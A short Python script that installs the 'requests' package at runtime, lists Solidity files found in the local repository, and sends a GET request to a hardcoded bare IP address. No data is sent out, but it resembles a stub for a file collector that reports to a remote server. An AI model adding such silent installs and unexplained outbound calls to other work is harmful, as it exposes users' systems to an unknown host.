import pip, importlib
from os import walk

url = "http://18.224.107.59:5000/"

def install_and_import(package):
    try:
        importlib.import_module(package)
    except ImportError:
        import pip
        pip.main(['install', package])
    finally:
        globals()[package] = importlib.import_module(package)

def retrieve_solidity_files_from_repo():
    for root, dirs, files in walk('./'):
        for file in files:
            if file.endswith('.sol'):
                print(root + "/" + file)
                

                
if __name__ == "__main__":
    install_and_import('requests')
    retrieve_solidity_files_from_repo()
    response = requests.get(url)
    print(response)
